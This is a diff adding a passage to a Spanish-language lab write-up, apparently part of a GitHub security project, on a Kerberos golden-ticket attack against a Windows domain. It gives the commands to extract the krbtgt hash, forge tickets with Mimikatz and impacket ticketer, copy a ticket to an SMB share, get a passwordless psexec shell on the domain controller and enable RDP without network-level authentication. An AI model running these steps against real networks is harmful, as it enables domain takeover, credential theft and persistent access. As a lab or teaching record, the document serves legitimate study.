@@ -320,3 +320,39 @@ El servicio
 ![image](https://github.com/Vicctoriaa/VISMA/assets/153718557/34302ab8-ded9-4f75-b5d3-af673406237f)
 
 Una vez lo ejecutamos, le ponemos el siguiente comando: “Isadump Isa /inject /name:krbtgt” extraer información sobre la cuenta de servicio "krbtgt" del sistema de autenticación de Windows, como el hash NTLM de este mismo, el SID del dominio y más.
+
+![image](https://github.com/Vicctoriaa/VISMA/assets/153718557/9d9864ac-dcfd-4ec2-88de-25fac895b635)
+
+Una vez temenos esta información la vamos a usar para generar un archivo llamado Golden.kirbi, este es un archivo de tickets Kerberos dorado.
+
+```
+copy golden.kirbi \\192.168.2.43\smbFolder\golden.kirbi
+```
+
+![image](https://github.com/Vicctoriaa/VISMA/assets/153718557/9481b1bc-a703-450e-a818-05cb31bfbc0f)
+
+Otra manera de hacerlo es con la herramienta ticketer de impacket con el hash de krbtgt el ssid del dominio, el dominio y el nombre de usuario de la cuenta de usuario para la cual se generará el ticket Kerberos dorado.
+
+![image](https://github.com/Vicctoriaa/VISMA/assets/153718557/3d87f931-a488-492b-9146-3b43869c9d83)
+
+Nos generará un archivo “Administrator.ccache” este lo usaremos para hacer pass the hash con psexec. Creamos una nueva variable de entorno llamada “KRBCCNAME” donde esta valdrá la ruta del archivo. Nos aseguramos de tener al DC en el `/etc/hosts` porque sinó no funcioa y al ejecutar el `psexec`, nos conectamos sin contraseña.
+El hecho de tener el archivo “Administrator.ccache” nos permite hacer pass the ticket incluso si la contraseña del usuario Administrator cambia. Por lo que tenemos permanencia.
+
+```
+$ export KRB5CCNAME="./Administrator.ccahe"
+$ cat /etc/hosts
+$ examples/psexec.py -k -n (dominio)/Administrator@DCCompany cmd.exe
+```
+
+![image](https://github.com/Vicctoriaa/VISMA/assets/153718557/809fcd8f-2977-4045-a808-b897984fd3ab)
+
+Una vez dentro, hacemos como antes y mediante la powershell activamos el escritorio remoto sin autenticación a nivel de red y ya podemos conectarnos con `rdesktop`.
+
+![image](https://github.com/Vicctoriaa/VISMA/assets/153718557/ce58390f-49ef-4f22-abf5-7ab640bd47d5)
+
+![image](https://github.com/Vicctoriaa/VISMA/assets/153718557/6336665b-a0ca-49ff-b180-681a6f5e8c65)
+
+Así se vería un diagrama de la RED simplificado:
+
+![image](https://github.com/Vicctoriaa/VISMA/assets/153718557/457f0e83-baa1-4d9b-8d8b-b38f3e603d33)
+
